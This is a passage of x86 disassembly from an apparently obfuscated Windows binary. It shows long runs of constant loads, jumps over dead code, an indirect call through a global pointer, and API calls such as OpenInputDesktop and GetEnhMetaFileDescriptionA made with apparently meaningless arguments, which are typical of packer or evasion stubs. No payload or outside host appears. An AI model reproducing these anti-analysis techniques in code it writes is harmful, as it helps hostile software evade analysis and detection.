		fld	ds:dbl_424810
		fstp	[ebp+var_890]
		fld	ds:dbl_424A48
		fstp	[ebp+var_888]
		fld	ds:dbl_4246A8
		fstp	[ebp+var_880]
		fld	ds:dbl_4247C0
		fstp	[ebp+var_878]
		fld	ds:dbl_4248A0
		fstp	[ebp+var_870]
		fld	ds:dbl_424790
		fstp	[ebp+var_868]
		fld	ds:dbl_4247C8
		fstp	[ebp+var_860]
		fld	ds:dbl_424650
		fstp	[ebp+var_858]
		fld	ds:dbl_4248B0
		fstp	[ebp+var_850]
		fld	ds:dbl_424BB0
		fstp	[ebp+var_848]
		fld	ds:dbl_424628
		fstp	[ebp+var_840]
		fld	ds:dbl_424990
		fstp	[ebp+var_838]
		fld	ds:dbl_424C08
		fstp	[ebp+var_830]
		fld	ds:dbl_424A10
		fstp	[ebp+var_828]
		fld	ds:dbl_4246F8
		fstp	[ebp+var_820]
		fld	ds:dbl_4249D0
		fstp	[ebp+var_818]
		fld	ds:dbl_424590
		fstp	[ebp+var_810]
		fld	ds:dbl_4244D0
		fstp	[ebp+var_808]
		fld	ds:dbl_4249D0
		fstp	[ebp+var_800]
		fld	ds:dbl_424648
		fstp	[ebp+var_7F8]
		fld	ds:dbl_4246A0
		fstp	[ebp+var_7F0]
		fld	ds:dbl_424AD0
		fstp	[ebp+var_7E8]
		fld	ds:dbl_424A60
		fstp	[ebp+var_7E0]
		fld	ds:dbl_424B98
		fstp	[ebp+var_7D8]
		fld	ds:dbl_424AE8
		fstp	[ebp+var_7D0]
		fld	ds:dbl_4247B0
		fstp	[ebp+var_7C8]
		fld	ds:dbl_424A90
		fstp	[ebp+var_7C0]
		fld	ds:dbl_424458
		fstp	[ebp+var_7B8]
		fld	ds:dbl_424B38
		fstp	[ebp+var_7B0]
		fld	ds:dbl_4244B8
		fstp	[ebp+var_7A8]
		fld	ds:dbl_424910
		fstp	[ebp+var_7A0]
		fld	ds:dbl_424818
		fstp	[ebp+var_798]
		fld	ds:dbl_4248A8
		fstp	[ebp+var_790]
		fld	ds:dbl_4244E0
		fstp	[ebp+var_788]
		fld	ds:dbl_424860
		fstp	[ebp+var_780]
		fld	ds:dbl_424A58
		fstp	[ebp+var_778]
		fld	ds:dbl_424AB0
		fstp	[ebp+var_770]
		fld	ds:dbl_4244E8
		fstp	[ebp+var_768]
		fld	ds:dbl_4248F8
		fstp	[ebp+var_760]
		fld	ds:dbl_424440
		fstp	[ebp+var_758]
		fld	ds:dbl_424990
		fstp	[ebp+var_750]
		fld	ds:dbl_424670
		fstp	[ebp+var_748]
		fld	ds:dbl_424B30
		fstp	[ebp+var_740]
		fld	ds:dbl_424AB0
		fstp	[ebp+var_738]
		fld	ds:dbl_424720
		fstp	[ebp+var_730]
		fld	ds:dbl_424498
		fstp	[ebp+var_728]
		fld	ds:dbl_424578
		fstp	[ebp+var_720]
		fld	ds:dbl_4245C0
		fstp	[ebp+var_718]
		fld	ds:dbl_424998
		fstp	[ebp+var_710]
		fld	ds:dbl_424708
		fstp	[ebp+var_708]
		fld	ds:dbl_424440
		fstp	[ebp+var_700]
		fld	ds:dbl_4244D0
		fstp	[ebp+var_6F8]
		fld	ds:dbl_424A10
		fstp	[ebp+var_6F0]
		fld	ds:dbl_424860
		fstp	[ebp+var_6E8]
		fld	ds:dbl_424638
		fstp	[ebp+var_6E0]
		fld	ds:dbl_424618
		fstp	[ebp+var_6D8]
		fld	ds:dbl_424738
		fstp	[ebp+var_6D0]
		fld	ds:dbl_4246D0
		fstp	[ebp+var_6C8]
		fld	ds:dbl_424688
		fstp	[ebp+var_6C0]
		fld	ds:dbl_424BD0
		fstp	[ebp+var_6B8]
		fld	ds:dbl_424930
		fstp	[ebp+var_6B0]
		fld	ds:dbl_4244A0
		fstp	[ebp+var_6A8]
		fld	ds:dbl_424520
		fstp	[ebp+var_6A0]
		fld	ds:dbl_424508
		fstp	[ebp+var_698]
		fld	ds:dbl_424468
		fstp	[ebp+var_690]
		fld	ds:dbl_424BC0
		fstp	[ebp+var_688]
		fld	ds:dbl_4245D8
		fstp	[ebp+var_680]
		fld	ds:dbl_424A30
		fstp	[ebp+var_678]
		fld	ds:dbl_424660
		fstp	[ebp+var_670]
		fld	ds:dbl_424A90
		fstp	[ebp+var_668]
		fld	ds:dbl_424BE8
		fstp	[ebp+var_660]
		fld	ds:dbl_424450
		fstp	[ebp+var_658]
		fldz
		fstp	[ebp+var_650]
		fld	ds:dbl_424870
		fstp	[ebp+var_648]
		fld	ds:dbl_4249E0
		fstp	[ebp+var_640]
		fld	ds:dbl_4248F0
		fstp	[ebp+var_638]
		fld	ds:dbl_424618
		fstp	[ebp+var_630]
		fld	ds:dbl_424B08
		fstp	[ebp+var_628]
		fld	ds:dbl_424870
		fstp	[ebp+var_620]
		fld	ds:dbl_424578
		fstp	[ebp+var_618]
		fld	ds:dbl_424B50
		fstp	[ebp+var_610]
		fld	ds:dbl_4244A0
		fstp	[ebp+var_608]
		fld	ds:dbl_424B40
		fstp	[ebp+var_600]
		fld	ds:dbl_424700
		fstp	[ebp+var_5F8]
		fld	ds:dbl_424458
		fstp	[ebp+var_5F0]
		fld	ds:dbl_4246F0
		fstp	[ebp+var_5E8]
		fld	ds:dbl_424808
		fstp	[ebp+var_5E0]
		fld	ds:dbl_424938
		fstp	[ebp+var_5D8]
		fld	ds:dbl_424610
		fstp	[ebp+var_5D0]
		fld	ds:dbl_424B70
		fstp	[ebp+var_5C8]
		fld	ds:dbl_424568
		fstp	[ebp+var_5C0]
		fld	ds:dbl_424440
		fstp	[ebp+var_5B8]
		fld	ds:dbl_4245F0
		fstp	[ebp+var_5B0]
		fld	ds:dbl_424570
		fstp	[ebp+var_5A8]
		fld	ds:dbl_424A80
		fstp	[ebp+var_5A0]
		fld	ds:dbl_424A98
		fstp	[ebp+var_598]
		fld	ds:dbl_424608
		fstp	[ebp+var_590]
		fld	ds:dbl_424B00
		fstp	[ebp+var_588]
		fld	ds:dbl_424A18
		fstp	[ebp+var_580]
		fld	ds:dbl_4244D0
		fstp	[ebp+var_578]
		fld	ds:dbl_424AA8
		fstp	[ebp+var_570]
		fld	ds:dbl_424630
		fstp	[ebp+var_568]
		fld	ds:dbl_424C00
		fstp	[ebp+var_560]
		fld	ds:dbl_4246F8
		fstp	[ebp+var_558]
		fld	ds:dbl_4248A0
		fstp	[ebp+var_550]
		fld	ds:dbl_424C00
		fstp	[ebp+var_548]
		fld	ds:dbl_4245D8
		fstp	[ebp+var_540]
		fld	ds:dbl_424730
		fstp	[ebp+var_538]
		fld	ds:dbl_4249F0
		fstp	[ebp+var_530]
		fld	ds:dbl_424B70
		fstp	[ebp+var_528]
		fld	ds:dbl_4247A8
		fstp	[ebp+var_520]
		fld	ds:dbl_4249F0
		fstp	[ebp+var_518]
		fld	ds:dbl_424610
		fstp	[ebp+var_510]
		fld	ds:dbl_424A38
		fstp	[ebp+var_508]
		fld	ds:dbl_4247C0
		fstp	[ebp+var_500]
		fld	ds:dbl_424640
		fstp	[ebp+var_4F8]
		fld	ds:dbl_424C10
		fstp	[ebp+var_4F0]
		fld	ds:dbl_424A50
		fstp	[ebp+var_4E8]
		fld	ds:dbl_424608
		fstp	[ebp+var_4E0]
		fld	ds:dbl_424810
		fstp	[ebp+var_4D8]
		fld	ds:dbl_424920
		fstp	[ebp+var_4D0]
		fld	ds:dbl_424660
		fstp	[ebp+var_4C8]
		fld	ds:dbl_424570
		fstp	[ebp+var_4C0]
		fld	ds:dbl_424B30
		fstp	[ebp+var_4B8]
		fld	ds:dbl_4248B8
		fstp	[ebp+var_4B0]
		fld	ds:dbl_4246E8
		fstp	[ebp+var_4A8]
		fld	ds:dbl_424610
		fstp	[ebp+var_4A0]
		fld	ds:dbl_424A38
		fstp	[ebp+var_498]
		fld	ds:dbl_4244E8
		fstp	[ebp+var_490]
		fld	ds:dbl_4248F0
		fstp	[ebp+var_488]
		fld	ds:dbl_424BD0
		fstp	[ebp+var_480]
		fld	ds:dbl_4249F8
		fstp	[ebp+var_478]
		fld	ds:dbl_4246B0
		fstp	[ebp+var_470]
		fld	ds:dbl_424798
		fstp	[ebp+var_468]
		fld	ds:dbl_4246E0
		fstp	[ebp+var_460]
		fld	ds:dbl_424820
		fstp	[ebp+var_458]
		fld	ds:dbl_424678
		fstp	[ebp+var_450]
		fld	ds:dbl_424860
		fstp	[ebp+var_448]
		fld	ds:dbl_4248D8
		fstp	[ebp+var_440]
		fld	ds:dbl_424738
		fstp	[ebp+var_438]
		fld	ds:dbl_424698
		fstp	[ebp+var_430]
		fld	ds:dbl_424B18
		fstp	[ebp+var_428]
		fld	ds:dbl_4245A0
		fstp	[ebp+var_420]
		fld	ds:dbl_424AB8
		fstp	[ebp+var_418]
		fld	ds:dbl_4245A8
		fstp	[ebp+var_410]
		fld	ds:dbl_424538
		fstp	[ebp+var_408]
		fld	ds:dbl_4249F8
		fstp	[ebp+var_400]
		fld	ds:dbl_4244F8
		fstp	[ebp+var_3F8]
		fld	ds:dbl_424650
		fstp	[ebp+var_3F0]
		fld	ds:dbl_4248D8
		fstp	[ebp+var_3E8]
		fld	ds:dbl_424770
		fstp	[ebp+var_3E0]
		fld	ds:dbl_424448
		fstp	[ebp+var_3D8]
		fld	ds:dbl_424B68
		fstp	[ebp+var_3D0]
		fld	ds:dbl_424470
		fstp	[ebp+var_3C8]
		fld	ds:dbl_4249A8
		fstp	[ebp+var_3C0]
		fld	ds:dbl_424A08
		fstp	[ebp+var_3B8]
		fld	ds:dbl_424A58
		fstp	[ebp+var_3B0]
		fld	ds:dbl_424920
		fstp	[ebp+var_3A8]
		fld	ds:dbl_4246D0
		fstp	[ebp+var_3A0]
		fld	ds:dbl_424730
		fstp	[ebp+var_398]
		fld	ds:dbl_4249B0
		fstp	[ebp+var_390]
		fld	ds:dbl_4246A0
		fstp	[ebp+var_388]
		fld	ds:dbl_4245C8
		fstp	[ebp+var_380]
		fld	ds:dbl_424598
		fstp	[ebp+var_378]
		fld	ds:dbl_4245D8
		fstp	[ebp+var_370]
		fld	ds:dbl_4244C8
		fstp	[ebp+var_368]
		fld	ds:dbl_4245F8
		fstp	[ebp+var_360]
		fld	ds:dbl_424878
		fstp	[ebp+var_358]
		fld	ds:dbl_424540
		fstp	[ebp+var_350]
		fld	ds:dbl_424508
		fstp	[ebp+var_348]
		fld	ds:dbl_424540
		fstp	[ebp+var_340]
		fld	ds:dbl_424B18
		fstp	[ebp+var_338]
		fld	ds:dbl_424438
		fstp	[ebp+var_330]
		fld	ds:dbl_424960
		fstp	[ebp+var_328]
		fld	ds:dbl_424998
		fstp	[ebp+var_320]
		fld	ds:dbl_424528
		fstp	[ebp+var_318]
		fld	ds:dbl_424A58
		fstp	[ebp+var_310]
		fld	ds:dbl_424920
		fstp	[ebp+var_308]
		fld	ds:dbl_424AE8
		fstp	[ebp+var_300]
		fld	ds:dbl_4249E8
		fstp	[ebp+var_2F8]
		fld	ds:dbl_4247D8
		fstp	[ebp+var_2F0]
		fld	ds:dbl_4249A0
		fstp	[ebp+var_2E8]
		fld	ds:dbl_424698
		fstp	[ebp+var_2E0]
		fld	ds:dbl_424C10
		fstp	[ebp+var_2D8]
		fld	ds:dbl_424A60
		fstp	[ebp+var_2D0]
		fld	ds:dbl_424BA0
		fstp	[ebp+var_2C8]
		fld	ds:dbl_424608
		fstp	[ebp+var_2C0]
		fld	ds:dbl_424C08
		fstp	[ebp+var_2B8]
		fld	ds:dbl_424AF0
		fstp	[ebp+var_2B0]
		fld	ds:dbl_4247F8
		fstp	[ebp+var_2A8]
		fld	ds:dbl_424C00
		fstp	[ebp+var_2A0]
		fld	ds:dbl_424630
		fstp	[ebp+var_298]
		fld	ds:dbl_424770
		fstp	[ebp+var_290]
		fld	ds:dbl_424A78
		fstp	[ebp+var_288]
		fld	ds:dbl_4247D8
		fstp	[ebp+var_280]
		fld	ds:dbl_424750
		fstp	[ebp+var_278]
		fld	ds:dbl_424480
		fstp	[ebp+var_270]
		fld	ds:dbl_424BE0
		fstp	[ebp+var_268]
		fld	ds:dbl_424AB0
		fstp	[ebp+var_260]
		fld	ds:dbl_4249E8
		fstp	[ebp+var_258]
		fld	ds:dbl_424560
		fstp	[ebp+var_250]
		fld	ds:dbl_424730
		fstp	[ebp+var_248]
		fld	ds:dbl_424800
		fstp	[ebp+var_240]
		fld	ds:dbl_424BE0
		fstp	[ebp+var_238]
		fld	ds:dbl_424910
		fstp	[ebp+var_230]
		fld	ds:dbl_424968
		fstp	[ebp+var_228]
		fld	ds:dbl_424528
		fstp	[ebp+var_220]
		fld	ds:dbl_424A40
		fstp	[ebp+var_218]
		fld	ds:dbl_424A30
		fstp	[ebp+var_210]
		fld	ds:dbl_424BC0
		fstp	[ebp+var_208]
		fld	ds:dbl_424698
		fstp	[ebp+var_200]
		fld	ds:dbl_4245C0
		fstp	[ebp+var_1F8]
		fld	ds:dbl_424818
		fstp	[ebp+var_1F0]
		fld	ds:dbl_424AC8
		fstp	[ebp+var_1E8]
		fld	ds:dbl_424788
		fstp	[ebp+var_1E0]
		fld	ds:dbl_424620
		fstp	[ebp+var_1D8]
		fld	ds:dbl_424C10
		fstp	[ebp+var_1D0]
		fld	ds:dbl_424870
		fstp	[ebp+var_1C8]
		fld	ds:dbl_424B40
		fstp	[ebp+var_1C0]
		fld	ds:dbl_424958
		fstp	[ebp+var_1B8]
		fld	ds:dbl_4246F8
		fstp	[ebp+var_1B0]
		fld	ds:dbl_424560
		fstp	[ebp+var_1A8]
		fld	ds:dbl_424448
		fstp	[ebp+var_1A0]
		fld	ds:dbl_4246F8
		fstp	[ebp+var_198]
		fld	ds:dbl_424A38
		fstp	[ebp+var_190]
		fld	ds:dbl_424550
		fstp	[ebp+var_188]
		fld	ds:dbl_4248A0
		fstp	[ebp+var_180]
		fld	ds:dbl_4248A8
		fstp	[ebp+var_178]
		fld	ds:dbl_424B30
		fstp	[ebp+var_170]
		fld	ds:dbl_424A78
		fstp	[ebp+var_168]
		fld	ds:dbl_424860
		fstp	[ebp+var_160]
		fld	ds:dbl_424830
		fstp	[ebp+var_158]
		fld	ds:dbl_4244F0
		fstp	[ebp+var_150]
		fld	ds:dbl_424BC0
		fstp	[ebp+var_148]
		fld	ds:dbl_424998
		fstp	[ebp+var_140]
		fld	ds:dbl_4244D0
		fstp	[ebp+var_138]
		fld	ds:dbl_4247A0
		fstp	[ebp+var_130]
		fld	ds:dbl_424A88
		fstp	[ebp+var_128]
		fld	ds:dbl_4246F8
		fstp	[ebp+var_120]
		fld	ds:dbl_424728
		fstp	[ebp+var_118]
		fld	ds:dbl_424960
		fstp	[ebp+var_110]
		fld	ds:dbl_424BA0
		fstp	[ebp+var_108]
		fld	ds:dbl_4248C8
		fstp	[ebp+var_100]
		fld	ds:dbl_424558
		fstp	[ebp+var_F8]
		fld	ds:dbl_424438
		fstp	[ebp+var_F0]
		fld	ds:dbl_424BF8
		fstp	[ebp+var_E8]
		fld	ds:dbl_424538
		fstp	[ebp+var_E0]
		fld	ds:dbl_4246B8
		fstp	[ebp+var_D8]
		fld	ds:dbl_424958
		fstp	[ebp+var_D0]
		fld	ds:dbl_424588
		fstp	[ebp+var_C8]
		fld	ds:dbl_424430
		fstp	[ebp+var_C0]
		fld	ds:dbl_424450
		fstp	[ebp+var_B8]
		fld	ds:dbl_424480
		fstp	[ebp+var_B0]
		fld	ds:dbl_4249A8
		fstp	[ebp+var_A8]
		fld	ds:dbl_4245E0
		fstp	[ebp+var_A0]
		jmp	short $+2
; ---------------------------------------------------------------------------

loc_406C74:				; CODE XREF: sub_402C40+4032j
		mov	ebx, [ebp+arg_0]
		jmp	short loc_406C7E
; ---------------------------------------------------------------------------
		lea	ebx, [ecx]
		shl	eax, 20h

loc_406C7E:				; CODE XREF: sub_402C40+4037j
		jmp	short loc_406C84
; ---------------------------------------------------------------------------
		test	edx, edx
		jnz	short loc_406CAC

loc_406C84:				; CODE XREF: sub_402C40:loc_406C7Ej
		push	ebx
		jmp	short loc_406C8C
; ---------------------------------------------------------------------------
		lea	ebx, [edx]
		lea	ecx, [edx-5]

loc_406C8C:				; CODE XREF: sub_402C40+4045j
		xchg	eax, esi
		jmp	short loc_406C91
; ---------------------------------------------------------------------------
		xor	esi, esi

loc_406C91:				; CODE XREF: sub_402C40+404Dj
		add	esi, esi
		xchg	eax, ebx
		mov	ebx, dword_4311A0
		or	eax, eax
		push	ebx
		pop	edx
		xchg	eax, ebx
		add	ebx, esi
		sub	esi, edx
		call	eax
		test	edx, ebx
		jz	short loc_406CAC
		shl	esi, 39h

loc_406CAC:				; CODE XREF: sub_402C40+4042j
					; sub_402C40+4067j
		movzx	edx, byte ptr [ebp+var_2A54]
		mov	[ebp+var_296C],	edx
		mov	[ebp+var_60], 49h
		movzx	eax, [ebp+var_2998]
		mov	ecx, 43h
		sub	ecx, eax
		mov	edx, [ebp+var_20]
		lea	eax, [ecx+edx+32h]
		mov	[ebp+var_2A7C],	ax
		movzx	ecx, [ebp+var_297C]
		cmp	[ebp+var_2A54],	ecx
		jle	short loc_406D0D
		mov	edx, [ebp+var_2960]
		sub	edx, [ebp+var_2A54]
		mov	[ebp+var_2A68],	edx
		mov	eax, [ebp+var_2A54]
		add	eax, 12h
		mov	[ebp+var_90], ax

loc_406D0D:				; CODE XREF: sub_402C40+40A9j
		movzx	ecx, [ebp+var_6]
		mov	[ebp+var_2984],	ecx
		movzx	edx, [ebp+var_2A7C]
		mov	eax, [ebp+var_2984]
		lea	ecx, [eax+edx+49h]
		mov	[ebp+var_2AFC],	ecx
		mov	edx, [ebp+var_2B10]
		add	edx, 82h
		and	edx, 5Ah
		mov	[ebp+var_2968],	dx
		mov	eax, [ebp+var_98]
		mov	ecx, [ebp+var_2A78]
		lea	edx, [ecx+eax-3Eh]
		movzx	eax, [ebp+var_299C]
		add	edx, eax
		movzx	ecx, [ebp+var_7]
		add	edx, ecx
		mov	[ebp+var_5], dl
		mov	edx, [ebp+var_2A80]
		add	edx, [ebp+var_2A68]
		movzx	eax, [ebp+var_29C0]
		sub	edx, eax
		xor	edx, [ebp+var_20]
		mov	[ebp+var_29D0],	dx
		mov	[ebp+var_38], 9
		mov	ecx, [ebp+var_2990]
		add	ecx, 41h
		mov	[ebp+var_2964],	ecx
		movzx	edx, [ebp+var_2A61]
		mov	eax, [ebp+var_2B10]
		add	eax, [ebp+var_296C]
		mov	ecx, [ebp+var_2A78]
		lea	eax, [eax+ecx+4Ch]
		xor	edx, eax
		mov	[ebp+var_299D],	dl
		mov	ecx, [ebp+var_296C]
		add	ecx, 33h
		mov	[ebp+var_2984],	ecx
		mov	[ebp+var_2A54],	1Ch
		movzx	edx, [ebp+var_6]
		mov	eax, 16h
		sub	eax, edx
		mov	[ebp+var_29B8],	eax
		mov	[ebp+var_29A4],	3Ah
		movzx	ecx, [ebp+var_18]
		add	ecx, [ebp+var_8C]
		mov	[ebp+var_2B10],	ecx
		mov	[ebp+var_70], 9
		movzx	edx, [ebp+var_2B09]
		sub	edx, [ebp+var_2964]
		mov	[ebp+var_2984],	edx
		mov	[ebp+var_2B18],	0
		jmp	short loc_406E39
; ---------------------------------------------------------------------------

loc_406E2A:				; CODE XREF: sub_402C40+429Aj
		mov	eax, [ebp+var_2B18]
		add	eax, 1
		mov	[ebp+var_2B18],	eax

loc_406E39:				; CODE XREF: sub_402C40+41E8j
		cmp	[ebp+var_2B18],	0Ah
		jge	loc_406EDF
		mov	ecx, 0FFFFFF98h
		sub	ecx, [ebp+var_2970]
		and	ecx, 30h
		mov	[ebp+var_297D],	cl
		mov	edx, 4Eh
		sub	edx, [ebp+var_2A80]
		movzx	eax, [ebp+var_2A50]
		add	edx, [ebp+var_20]
		add	eax, edx
		mov	[ebp+var_29BC],	ax
		movzx	ecx, [ebp+var_2A50]
		add	ecx, 42h
		mov	[ebp+var_2984],	ecx
		mov	edx, [ebp+var_29A8]
		sub	edx, [ebp+var_2A54]
		movzx	eax, [ebp+var_7]
		sub	eax, [ebp+var_2AF8]
		or	edx, eax
		mov	[ebp+var_29D0],	dx
		movzx	ecx, [ebp+var_2A4C]
		add	ecx, 4Dh
		mov	[ebp+var_2A4C],	cx
		mov	edx, [ebp+var_2A78]
		mov	[ebp+var_5C], edx
		movzx	eax, [ebp+var_297C]
		add	eax, [ebp+var_20]
		movzx	ecx, [ebp+var_297C]
		add	eax, ecx
		mov	[ebp+var_29B8],	eax
		jmp	loc_406E2A
; ---------------------------------------------------------------------------

loc_406EDF:				; CODE XREF: sub_402C40+4200j
		movzx	edx, [ebp+var_14]
		movzx	eax, [ebp+var_2968]
		sub	eax, edx
		mov	[ebp+var_2968],	ax
		mov	ecx, 83h
		sub	ecx, [ebp+var_29A8]
		mov	[ebp+var_2B04],	cx
		pop	esi
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn
sub_402C40	endp

; ---------------------------------------------------------------------------
		align 10h
		push	ebp
		mov	ebp, esp
		sub	esp, 26Ch
		push	ebx
		mov	ebx, [ebp-0A0h]
		add	ebx, 53h
		push	2Dh
		mov	eax, [ebp+0Ch]
		push	eax
		push	13h
		call	ds:OpenInputDesktop
		sub	ebx, eax
		sub	ebx, 1Bh
		sub	ebx, [ebp-0BCh]
		mov	[ebp-109h], bl
		mov	ecx, [ebp+1Ch]
		add	ecx, 3
		mov	edx, [ebp-1C4h]
		and	edx, 10h
		xor	ecx, edx
		mov	[ebp-122h], cl
		lea	eax, [ebp+1Ch]
		sub	eax, 2Bh
		mov	ecx, [eax]
		mov	[ebp-128h], ecx
		mov	edx, [ebp+10h]
		mov	[ebp-140h], edx
		mov	eax, [ebp-128h]
		add	eax, 13h
		mov	[ebp-0A8h], eax
		mov	dword ptr [ebp-26Ch], 0
		jmp	short loc_406F9A
; ---------------------------------------------------------------------------

loc_406F8B:				; CODE XREF: .text:00407039j
		mov	ecx, [ebp-26Ch]
		add	ecx, 1
		mov	[ebp-26Ch], ecx

loc_406F9A:				; CODE XREF: .text:00406F89j
		cmp	dword ptr [ebp-26Ch], 0Ah
		jge	loc_40703E
		movzx	edx, byte ptr [ebp-0C9h]
		add	edx, 46h
		movzx	eax, byte ptr [ebp-0C9h]
		sub	edx, eax
		add	edx, [ebp-0A8h]
		mov	[ebp-0E4h], dx
		movzx	ecx, byte ptr [ebp-22h]
		mov	[ebp+0Ch], ecx
		mov	edx, 5Bh
		sub	edx, [ebp-0A8h]
		xor	edx, 47h
		movzx	eax, word ptr [ebp-1B4h]
		add	eax, edx
		mov	[ebp-1B4h], ax
		mov	dword ptr [ebp-1D0h], 2Fh
		movzx	ecx, byte ptr [ebp-22h]
		mov	edx, 1Bh
		sub	edx, ecx
		movzx	eax, byte ptr [ebp-122h]
		add	edx, eax
		movzx	ecx, word ptr [ebp-258h]
		sub	ecx, edx
		mov	[ebp-258h], cx
		mov	edx, [ebp+8]
		push	edx
		push	36h
		push	11h
		call	ds:GetEnhMetaFileDescriptionA
		add	eax, 52h
		mov	ecx, [ebp-0A0h]
		add	ecx, 39h
		and	eax, ecx
		mov	[ebp-21h], al
		jmp	loc_406F8B
; ---------------------------------------------------------------------------

loc_40703E:				; CODE XREF: .text:00406FA1j
		movzx	edx, word ptr [ebp-104h]
		xor	edx, 6
		mov	[ebp-104h], dx
		mov	eax, [ebp+8]
		sub	eax, [ebp-264h]
		sub	eax, [ebp-0ECh]
		sub	eax, 2Fh
		and	eax, 0Eh
		mov	[ebp-0E5h], al
		mov	ecx, [ebp-10h]
		mov	[ebp+8], ecx
		movzx	edx, byte ptr [ebp-121h]
		movzx	eax, word ptr [ebp-98h]
		add	edx, [ebp+18h]
		add	eax, edx
		movzx	ecx, word ptr [ebp-258h]
		movzx	edx, byte ptr [ebp-121h]
		sub	ecx, edx
		xor	eax, ecx
		mov	[ebp-5], al
		mov	eax, [ebp-0A0h]
		mov	ecx, [ebp-0BCh]
		lea	edx, [ecx+eax+3Dh]
		mov	[ebp-98h], dx
		mov	dword ptr [ebp-0BCh], 2Dh
		mov	eax, [ebp+0Ch]
		add	eax, 53h
		mov	[ebp-1B0h], eax
		mov	ecx, 43h
		sub	ecx, [ebp-0A4h]
		sub	ecx, 0CAh
		mov	[ebp-6], cl
		mov	edx, [ebp-0ECh]
		sub	edx, [ebp-10h]
		mov	eax, [ebp-0F4h]
		add	eax, 5
		or	edx, eax
		mov	[ebp-5], dl
		mov	ecx, [ebp+10h]
		add	ecx, 56h
		and	ecx, 14h
		mov	[ebp-254h], ecx
		movzx	edx, byte ptr [ebp-109h]
		add	edx, 5Eh
		mov	[ebp-0A0h], edx
		mov	dword ptr [ebp-1D0h], 60h
		movzx	eax, byte ptr [ebp-5]
		add	eax, 1Bh
		sub	eax, [ebp-0B0h]
		mov	[ebp-250h], eax
		mov	dword ptr [ebp-254h], 0FFFFFFD8h
		movzx	ecx, word ptr [ebp-258h]
		mov	edx, 3Dh
		sub	edx, ecx
		and	edx, [ebp-0BCh]
		mov	[ebp-254h], edx
		movzx	eax, byte ptr [ebp-22h]
		add	eax, 0Ah
		mov	[ebp-0BCh], eax
		movzx	ecx, word ptr [ebp-104h]
		add	ecx, [ebp-18h]
		movzx	edx, byte ptr [ebp-10Ah]
		sub	ecx, edx
		mov	eax, [ebp-0ECh]
		lea	ecx, [ecx+eax-0Fh]
		mov	[ebp-21h], cl
		movzx	edx, byte ptr [ebp-6]
		add	edx, 1Fh
		mov	eax, dword_42C038
		sub	eax, edx
		mov	dword_42C038, eax
		mov	eax, [ebp-0A0h]
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn
; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_4071A0	proc near		; CODE XREF: .text:00408F2Ep

var_254		= dword	ptr -254h
var_250		= dword	ptr -250h
var_248		= dword	ptr -248h
var_238		= word ptr -238h
var_1D8		= dword	ptr -1D8h
var_1B0		= dword	ptr -1B0h
var_1A9		= byte ptr -1A9h
var_1A0		= dword	ptr -1A0h
var_199		= byte ptr -199h
var_194		= dword	ptr -194h
var_18C		= dword	ptr -18Ch
var_188		= word ptr -188h
var_14C		= dword	ptr -14Ch
var_148		= dword	ptr -148h
var_10E		= byte ptr -10Eh
var_10D		= byte ptr -10Dh
var_108		= dword	ptr -108h
var_100		= dword	ptr -100h
var_DC		= dword	ptr -0DCh
var_CC		= word ptr -0CCh
dwFlags		= dword	ptr -0BCh
var_B0		= dword	ptr -0B0h
var_A8		= word ptr -0A8h
var_A0		= dword	ptr -0A0h
var_8C		= dword	ptr -8Ch
var_64		= dword	ptr -64h
var_44		= dword	ptr -44h
var_14		= word ptr -14h
var_10		= dword	ptr -10h
var_5		= byte ptr -5
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h
arg_10		= dword	ptr  18h
arg_42		= word ptr  4Ah

		push	ebp
		mov	ebp, esp
		sub	esp, 254h
		push	esi
		mov	[ebp+var_254], 0
		jmp	short loc_4071C5
; ---------------------------------------------------------------------------

loc_4071B6:				; CODE XREF: sub_4071A0+BEj
		mov	eax, [ebp+var_254]
		add	eax, 1
		mov	[ebp+var_254], eax

loc_4071C5:				; CODE XREF: sub_4071A0+14j
		cmp	[ebp+var_254], 0Dh
		jge	loc_407263
		mov	ecx, [ebp+var_8C]
		mov	edx, [ebp+arg_8]
		lea	eax, [edx+ecx+2Dh]
		mov	ecx, [ebp+dwFlags]
		lea	edx, [eax+ecx+37h]
		mov	[ebp+var_10E], dl
		movzx	eax, [ebp+var_199]
		add	eax, 9Fh
		mov	[ebp+var_A0], eax
		mov	ecx, [ebp+var_14C]
		mov	[ebp+arg_0], ecx
		mov	edx, [ebp+var_194]
		mov	eax, [ebp+var_1B0]
		lea	ecx, [eax+edx-3Ch]
		mov	[ebp+var_238], cx
		lea	edx, [ebp+arg_4]
		sub	edx, 47h
		movzx	eax, byte ptr [edx]
		mov	[ebp+arg_10], eax
		mov	[ebp+var_1D8], 41h
		mov	ecx, [ebp+var_B0]
		mov	[ebp+var_1A0], ecx
		movzx	edx, [ebp+var_238]
		sub	edx, 20h
		mov	[ebp+var_238], dx
		movzx	eax, [ebp+var_14]
		mov	[ebp+var_18C], eax
		jmp	loc_4071B6
; ---------------------------------------------------------------------------

loc_407263:				; CODE XREF: sub_4071A0+2Cj
		movzx	ecx, [ebp+var_CC]
		mov	edx, 3Ch
		sub	edx, ecx
		add	edx, [ebp+arg_0]
		mov	[ebp+var_5], dl
		movzx	eax, [ebp+arg_42]
		mov	[ebp+var_1A0], eax
		mov	ecx, [ebp+arg_4]
		mov	edx, [ebp+arg_8]
		lea	eax, [edx+ecx+66h]
		sub	eax, [ebp+var_B0]
		mov	[ebp+var_1A9], al
		mov	ecx, dword_42C000
		cmp	ecx, [ebp+var_DC]
		jl	short loc_4072D1
		mov	edx, [ebp+var_1A0]
		mov	eax, [ebp+arg_C]
		lea	ecx, [eax+edx+0Dh]
		mov	[ebp+var_108], ecx
		mov	edx, [ebp+var_100]
		push	edx
		mov	eax, [ebp+arg_C]
		push	eax
		call	sub_40F9D0
		add	esp, 8
		mov	[ebp+var_250], eax

loc_4072D1:				; CODE XREF: sub_4071A0+103j
		mov	esi, [ebp+arg_0]
		add	esi, [ebp+var_B0]
		mov	ecx, [ebp+dwFlags]
		push	ecx		; dwFlags
		push	20h		; hwnd
		call	ds:MonitorFromWindow
		sub	esi, eax
		mov	[ebp+var_10], esi
		mov	[ebp+var_148], 59h
		mov	[ebp+arg_4], 27h
		movzx	edx, [ebp+var_10D]
		sub	edx, 1Ah
		mov	[ebp+var_100], edx
		movzx	eax, word ptr [ebp+arg_C]
		mov	[ebp+arg_4], eax
		mov	ecx, [ebp+arg_0]
